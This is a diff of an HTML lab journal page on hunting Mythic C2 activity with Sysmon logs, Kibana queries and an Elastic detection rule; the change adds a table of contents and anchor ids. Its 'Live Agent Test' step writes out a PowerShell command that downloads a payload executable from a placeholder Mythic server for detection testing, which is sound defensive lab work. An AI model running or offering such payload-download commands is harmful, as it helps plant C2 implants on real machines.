@@ -1,11 +1,25 @@
-<h2>🕵️‍♂️ Day 28: Mythic C2 Threat Hunting - Investigating Command and Control</h2>
+<nav>
+  <h3>📚 Table of Contents</h3>
+  <ul>
+    <li><a href="#objective">Objective</a></li>
+    <li><a href="#cheat-method">Known IOC Investigation (Cheat Method)</a></li>
+    <li><a href="#generic-discovery">Unknown C2 Discovery (Generic Threat Hunting)</a></li>
+    <li><a href="#timeline">Timeline Building</a></li>
+    <li><a href="#detection">Detection Rule Setup</a></li>
+    <li><a href="#correlation">Correlation Fields</a></li>
+    <li><a href="#live-test">Live Agent Test</a></li>
+    <li><a href="#outcome">Outcome</a></li>
+  </ul>
+</nav>
+
+<h2 id="objective">🕵️‍♂️ Day 28: Mythic C2 Threat Hunting - Investigating Command and Control</h2>
 
 <h3>✅ Objective:</h3>
 <p>Investigate activity related to the <strong>Mythic C2 framework</strong> using Sysmon logs via Kibana Discover and Dashboards.</p>
 
 <hr>
 
-<h3>🔍 Step-by-Step Threat Hunting Approach</h3>
+<h3 id="cheat-method">🔍 Step-by-Step Threat Hunting Approach</h3>
 
 <h4>1. Known IOC Investigation (Cheat Method)</h4>
 <pre>
@@ -20,7 +34,7 @@ Location: C:\Users\Public\Downloads\
   <li>Review full process chain</li>
 </ul>
 
-<h4>2. Unknown C2 Discovery (Generic Threat Hunting)</h4>
+<h4 id="generic-discovery">2. Unknown C2 Discovery (Generic Threat Hunting)</h4>
 
 <h5>A. Network Behavior (Sysmon Event ID 3)</h5>
 <pre>
@@ -39,7 +53,7 @@ event.code: "1" AND winlog.event_data.Image.keyword : "*rundll32.exe" OR "*power
 
 <hr>
 
-<h3>📌 Timeline Building</h3>
+<h3 id="timeline">📌 Timeline Building</h3>
 <p>Pivot across event types using <code>ProcessGuid</code>:</p>
 
 <table border="1" cellpadding="6">
@@ -67,7 +81,7 @@ event.code: "1" AND winlog.event_data.Image.keyword : "*rundll32.exe" OR "*power
 
 <hr>
 
-<h3>🛠️ Detection Rule Setup (Elastic Security)</h3>
+<h3 id="detection">🛠️ Detection Rule Setup (Elastic Security)</h3>
 <ul>
   <li>Update rule schedule to <strong>every 1 minute</strong></li>
   <li>Action: Send webhook to OS Ticket</li>
@@ -82,7 +96,7 @@ event.code: "1" AND winlog.event_data.Image.keyword : "*rundll32.exe" OR "*power
 
 <hr>
 
-<h3>💡 Correlation Fields to Use</h3>
+<h3 id="correlation">💡 Correlation Fields to Use</h3>
 <ul>
   <li><code>winlog.event_data.ProcessGuid</code></li>
   <li><code>winlog.event_data.ParentImage</code></li>
@@ -92,7 +106,7 @@ event.code: "1" AND winlog.event_data.Image.keyword : "*rundll32.exe" OR "*power
 
 <hr>
 
-<h3>🧪 Live Agent Test</h3>
+<h3 id="live-test">🧪 Live Agent Test</h3>
 <ol>
   <li>Download payload:
     <pre>powershell -Command "Invoke-WebRequest -Uri http://<your mythic server ip>:9999/mydfir-d30.exe -OutFile C:\Users\Public\Downloads\mydfir-d30.exe"</pre>
@@ -104,7 +118,7 @@ event.code: "1" AND winlog.event_data.Image.keyword : "*rundll32.exe" OR "*power
 
 <hr>
 
-<h3>🎯 Outcome</h3>
+<h3 id="outcome">🎯 Outcome</h3>
 <ul>
   <li>Confirmed Mythic C2 activity via Sysmon logs</li>
   <li>Auto-generated alert linked to OS Ticket</li>
